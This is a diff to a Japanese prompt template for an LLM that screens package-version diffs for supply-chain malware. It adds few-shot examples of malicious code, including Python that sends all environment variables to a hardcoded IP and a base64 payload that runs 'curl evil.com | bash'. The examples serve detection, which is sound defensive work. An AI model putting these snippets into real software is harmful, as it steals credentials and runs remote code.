@@ -6,65 +6,68 @@
 - パッケージ名: {package_name}
 - バージョン変更: {old_version} → {new_version}
 
+---
+
+## 過去に実際に検出された悪意ある変更パターン（Few-shot examples）
+
+### 例1: 環境変数窃取 (ctx 0.2.0→0.2.1, PyPI)
+```diff
++import os, base64, urllib.request
++def _send(d):
++    urllib.request.urlopen(urllib.request.Request(
++        'http://195.123.234.11:8080/collect',
++        data=base64.b64encode('\n'.join(f'{k}={v}' for k,v in os.environ.items()).encode())
++    ))
++_send('')
+```
+→ 判定: MALICIOUS / CRITICAL / EXFILTRATION (CWE-200)
+
+### 例2: postinstall経由のペイロード実行 (ua-parser-js 0.7.28→0.7.29, npm)
+```diff
+ "scripts": {
++  "preinstall": "node -e \"const http=require('http');const os=require('os');...\"",
+   "test": "..."
+```
+→ 判定: MALICIOUS / CRITICAL / BUILD_HOOK_ABUSE (CWE-829)
+
+### 例3: 依存パッケージ経由の隠蔽 (event-stream 3.3.5→3.3.6, npm)
+```diff
+-  "dependencies": {},
++  "dependencies": {
++    "flatmap-stream": "0.1.1"
++  }
+```
+→ 判定: MALICIOUS / CRITICAL / DEPENDENCY_CONFUSION (後続の flatmap-stream がペイロードを含む)
+
+### 例4: 難読化+実行 (典型的パターン)
+```diff
++_x = __import__('base64').b64decode(b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3AgfCBiYXNoJyk=')
++exec(compile(_x, '<string>', 'exec'))
+```
+→ 判定: MALICIOUS / CRITICAL / OBFUSCATION + EXECUTION (CWE-506)
+
+---
+
 ## 分析する脅威カテゴリ
 
-1. **OBFUSCATION** (CWE-506): 難読化されたコード
-   - base64/hex/XOR/ROT によるデコード処理
-   - eval/exec による動的コード実行
-   - 無意味な変数名や意図的な可読性低下
+1. **OBFUSCATION** (CWE-506): base64/hex/XOR + eval/exec、難読化変数名
+2. **NETWORK** (CWE-913): ハードコードIP/URL、C2接続、DNSトンネリング
+3. **PERSISTENCE** (CWE-693): cron/systemd/レジストリ/シェルプロファイルへの書き込み
+4. **EXFILTRATION** (CWE-200): 環境変数・SSHキー・クラウドクレデンシャルの外部送信
+5. **EXECUTION** (CWE-78): subprocess shell=True、os.system、動的コード実行
+6. **STEGANOGRAPHY** (CWE-116): バイナリへのペイロード埋め込み
+7. **TYPOSQUATTING** (CWE-1021): 人気パッケージへの類似命名（メタデータ確認）
+8. **DEPENDENCY_CONFUSION** (CWE-1021): 新規依存パッケージの追加（特に無名パッケージ）
+9. **BUILD_HOOK_ABUSE** (CWE-829): setup.py/postinstall/preinstallへのコード実行追加
+10. **METADATA_MANIPULATION** (CWE-345): maintainer/homepage URLの不審な変更
 
-2. **NETWORK** (CWE-913): 予期しない外部通信
-   - C2サーバーへの接続パターン
-   - DNSトンネリング
-   - ハードコードされたIPアドレスへの通信
-   - 既知サービス（PyPI/npm API等）以外へのHTTP/S通信
-
-3. **PERSISTENCE** (CWE-693): 永続化
-   - cron/systemd/launchd/レジストリへの書き込み
-   - スタートアップスクリプトの変更
-   - シェルプロファイル（.bashrc/.zshrc等）の変更
-
-4. **EXFILTRATION** (CWE-200): 機密情報の外部送信
-   - 環境変数（APIキー・シークレット）の読み取りと送信
-   - SSHキー・GPGキーへのアクセス
-   - クラウドクレデンシャル（AWS/GCP/Azure）
-   - ブラウザパスワードストア
-
-5. **EXECUTION** (CWE-78): 任意コード実行
-   - subprocess/os.system/os.popen の不審な使用
-   - シェルインジェクションの可能性
-   - ファイルパーミッション変更 (chmod +x)
-
-6. **STEGANOGRAPHY** (CWE-116): ペイロード隠蔽
-   - 画像・音声・バイナリファイルへのデータ埋め込み
-   - コメント内の隠しコード
-
-7. **TYPOSQUATTING** (CWE-1021): タイポスクワッティング
-   - メタデータが人気パッケージに類似（名前・説明文）
-   - 別パッケージへの偽装
-
-8. **DEPENDENCY_CONFUSION** (CWE-1021): 依存関係混乱攻撃
-   - 内部パッケージ名を使ったパブリックパッケージ
-   - 内部ネームスペースの詐称
-
-9. **BUILD_HOOK_ABUSE** (CWE-829): ビルドフック悪用
-   - setup.py の install コマンド内でのシェル実行
-   - postinstall/preinstall スクリプトの悪用
-   - pyproject.toml の hatch/flit build hooks
-
-10. **METADATA_MANIPULATION** (CWE-345): メタデータ改ざん
-    - maintainer/author 情報の不審な変更
-    - license の変更
-    - homepage/repository URLの変更
-
-## 重要な注意事項
-- diffの「+」行（追加）に注目してください
-- 削除された悪意あるコード（「-」行）も記録してください（過去バージョンの問題として）
-- テストファイルやドキュメントの変更は低優先度
-- 公式APIクライアントコード（PyPI/npm API呼び出し等）は通常問題なし
+## 重点的に見るべき箇所
+- `setup.py`, `__init__.py`, `index.js`, `package.json` の追加行（+）
+- `install_requires`, `dependencies`, `devDependencies` の新規エントリ
+- バイナリファイルの追加
 
 ## 出力フォーマット
-応答は必ず以下のJSON形式のみで返してください（前後に説明文・```記号不要、日本語で）:
+応答は必ず以下のJSONのみ（前後に文章・```不要）:
 {{
   "verdict": "MALICIOUS",
   "severity": "CRITICAL",
@@ -72,11 +75,11 @@
   "findings": [
     {{
       "category": "EXFILTRATION",
-      "description": "AWS_SECRET_ACCESS_KEYを103.45.67.89:8080に送信するコードが追加された",
-      "file": "requests/auth.py",
-      "line_start": 42,
-      "line_end": 67,
-      "evidence": "os.environ.get('AWS_SECRET')",
+      "description": "AWS_SECRET_ACCESS_KEYを外部IPへ送信するコードが追加された",
+      "file": "pkg/__init__.py",
+      "line_start": 5,
+      "line_end": 12,
+      "evidence": "urllib.request.urlopen('http://1.2.3.4')",
       "cwe": "CWE-200",
       "severity": "CRITICAL"
     }}
@@ -84,13 +87,8 @@
   "summary": "総合評価（日本語・200文字以内）"
 }}
 
-**verdict の選択基準:**
-- MALICIOUS: 悪意あるコードが確実に存在する
-- SUSPICIOUS: 怪しいが確実でない、または意図が不明
-- BENIGN: 問題なし
-- UNKNOWN: diffが不十分で判断できない
-
-**findingsが空の場合は空配列 [] を返すこと**
+verdict: MALICIOUS（確実） / SUSPICIOUS（疑わしい） / BENIGN（問題なし） / UNKNOWN（判断不能）
+findings が空なら []
 
 ---
 {diff_chunk}
